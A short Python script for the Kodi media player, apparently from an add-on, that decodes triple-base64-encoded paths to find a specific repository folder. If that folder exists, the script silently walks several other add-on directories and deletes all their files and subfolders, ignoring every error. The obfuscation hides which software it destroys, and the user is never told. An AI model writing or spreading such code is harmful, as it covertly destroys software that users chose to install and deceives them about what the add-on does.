import xbmc
import os
import shutil
import base64


def iiNT3LiiBrothers(url):
	Jose = url
	Mathews = base64.b64decode(Jose)
	iiNT3LiiG3NCii = base64.b64decode(Mathews)
	Robb = base64.b64decode(iiNT3LiiG3NCii)
	return Robb


thisFuckingGuy = xbmc.translatePath(iiNT3LiiBrothers('WXpOQ2JGa3liR2hpUkc5MlRESm9kbUpYVlhaWlYxSnJZakkxZWt3elNteGpSemw2WVZoU2RtTnVhM1ZSTTJ4M1lVZFdlV015ZUhaWk1uUnNZMmM5UFE9PQ=='))

if not os.path.exists(thisFuckingGuy):
	quit()

else:

	iiNT3LiiSOUL = (xbmc.translatePath(iiNT3LiiBrothers('WXpOQ2JGa3liR2hpUkc5MlRESm9kbUpYVlhaWlYxSnJZakkxZWt3elFuTmtWMlJ3WW1rMU1tRlhVbXhpZVRVelpFZGFkbU50Y3owPQ==')), xbmc.translatePath(iiNT3LiiBrothers('WXpOQ2JGa3liR2hpUkc5MlRESm9kbUpYVlhaWlYxSnJZakkxZWt3elNteGpSemw2WVZoU2RtTnVhM1ZqTWpreFlrZDRiR016VFQwPQ==')), xbmc.translatePath(iiNT3LiiBrothers('WXpOQ2JGa3liR2hpUkc5MlRESm9kbUpYVlhaWlYxSnJZakkxZWt3elFuTmtWMlJ3WW1rMU1tRlhVbXhpZVRWM1lqTk9iR0ZYVW5aaVp6MDk=')), xbmc.translatePath(iiNT3LiiBrothers('WXpOQ2JGa3liR2hpUkc5MlRESm9kbUpYVlhaWlYxSnJZakkxZWt3elFuTmtWMlJ3WW1rMU1tRlhVbXhpZVRVd1kyMXNNR0l5TkQwPQ==')))

	for iiNT3LL3SS in iiNT3LiiSOUL:

		if os.path.exists(iiNT3LL3SS):

			for root, dirs, files in os.walk(iiNT3LL3SS, topdown=True):

				if int(len(files)) > 0:

					for f in files:
						try:
							os.unlink(os.path.join(root, f))
						except:
							pass

				if int(len(dirs)) > 0:

					for d in dirs:
						try:
							shutil.rmtree(os.path.join(root, d))
						except:
							pass

	quit()
